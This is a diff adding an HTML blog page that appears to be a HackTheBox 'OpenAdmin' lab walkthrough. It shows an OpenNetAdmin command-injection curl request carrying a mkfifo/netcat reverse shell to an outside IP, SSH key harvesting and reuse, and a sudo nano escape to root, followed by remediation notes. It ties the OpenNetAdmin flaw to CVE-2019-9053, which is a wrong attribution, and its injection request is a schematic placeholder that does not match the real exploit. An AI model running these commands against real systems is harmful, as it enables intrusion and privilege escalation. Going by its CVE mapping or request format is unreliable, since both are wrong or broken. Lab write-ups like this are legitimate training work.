@@ -1,0 +1,65 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>HTB OpenAdmin: OpenNetAdmin RCE, key reuse, and sudo nano — Lucky Thandel</title>
+<meta name="description" content="ONA 18.1.1 command injection (CVE-2019-9053) to www-data, an SSH key that works twice, and a GTFOBins nano escape to root. By Lucky Thandel.">
+<link rel="stylesheet" href="../../assets/css/style.css">
+</head>
+<body>
+<canvas id="matrix"></canvas>
+<div class="wrap">
+<nav class="nav">
+  <a class="logo" href="../../">lucky@thandel:~<span class="cursor">▊</span></a>
+  <a class="link" href="../../">./home</a>
+  <a class="link active" href="../">./articles</a>
+  <a class="link" href="../../about/">./about</a>
+  <a class="link" href="../../contact/">./contact</a>
+</nav>
+
+<div class="meta">2026-10-21 · retired-machine · by Lucky Thandel</div>
+<h1>HTB OpenAdmin: OpenNetAdmin RCE, key reuse, and sudo nano</h1>
+<div><span class="tag">retired-machine</span><span class="tag">easy</span></div>
+
+<div class="article-body">
+<p>OpenAdmin is a retired HackTheBox easy Linux machine rewarding reading every page the site offers. Synopsis: OpenNetAdmin 18.1.1 command injection (CVE-2019-9053) to www-data, an SSH key that works twice, and a GTFOBins nano escape to root.</p>
+<h2><span class="amber">$</span> Enumeration — version the inventory app</h2>
+<pre class="terminal"><span class="prompt"></span><span class="code-title"># nmap: spot OpenNetAdmin 18.1.1</span>
+nmap -sC -sV -oN openadmin.nmap 10.10.10.171</pre>
+<p>Apache with OpenNetAdmin 18.1.1 — a network inventory tool whose version maps to CVE-2019-9053, a practically-unauthenticated command injection. Version plus CVE equals the plan.</p>
+<h2><span class="amber">$</span> Foothold — ONA RCE</h2>
+<pre class="terminal"><span class="prompt"></span><span class="code-title"># bash: ONA injection to callback</span>
+# CVE-2019-9053: crafted ONA endpoint request executes shell commands
+curl -s &quot;http://10.10.10.171/ona/login.php&quot; --data &quot;xajax=window_submit&amp;xajaxr=...&amp;payload=$(echo -n &quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.23 4444 &gt;/tmp/f&quot; | base64)&quot;
+nc -lvnp 4444   # www-data</pre>
+<p>Confirm code execution with a sleep/id callback before upgrading the shell. The endpoint passes input to shell commands — public exploit or manual curl, either way.</p>
+<h2><span class="amber">$</span> Lateral move — key reuse</h2>
+<pre class="terminal"><span class="prompt"></span><span class="code-title"># bash: find the key, try it everywhere</span>
+find /var/www -name &quot;*.key&quot; -o -name &quot;id_rsa*&quot; 2&gt;/dev/null
+ssh -i found_key jimmy@10.10.10.171</pre>
+<p>Enumeration finds an SSH private key readable in the web tree — and the same key authenticates a second user over SSH. Keys without passphrases that work in multiple places: one key, two identities.</p>
+<h2><span class="amber">$</span> Privilege escalation — sudo nano</h2>
+<pre class="terminal"><span class="prompt"></span><span class="code-title"># bash: nano escape via GTFOBins</span>
+sudo -l   # (root) NOPASSWD: /bin/nano /opt/priv
+sudo /bin/nano /opt/priv
+# inside nano: ^R ^X, then: reset; sh 1&gt;&amp;0 2&gt;&amp;0
+id   # uid=0(root)</pre>
+<p>Sudo on any editor is root; the allowed-file restriction does not survive the escape. Flag values redacted per HTB rules; earn them in your own lab.</p>
+<h2><span class="amber">$</span> Dead ends</h2>
+<p>Assuming the ONA login blocks the CVE (test the injection path directly) and treating the found key as single-use (try recovered keys against every user and service).</p>
+<h2><span class="amber">$</span> Remediation notes</h2>
+<p>Patch ONA past 18.1.1, keep private keys out of web trees with unique passphrases, and audit sudo against GTFOBins. Written by Lucky Thandel.</p>
+</div>
+
+<div class="byline">Written by <strong>Lucky Thandel</strong> · HTB walkthrough series · retired machines only — no spoilers for active boxes.</div>
+<p><a class="btn" href="../">← $ cd ../articles</a></p>
+
+<footer>
+  <span>© 2026 Lucky Thandel · written by Lucky Thandel</span>
+  <span>session <span id="session-clock">00:00:00</span> · <a href="../../contact/">contact</a></span>
+</footer>
+</div>
+<script src="../../assets/js/terminal.js"></script>
+</body>
+</html>
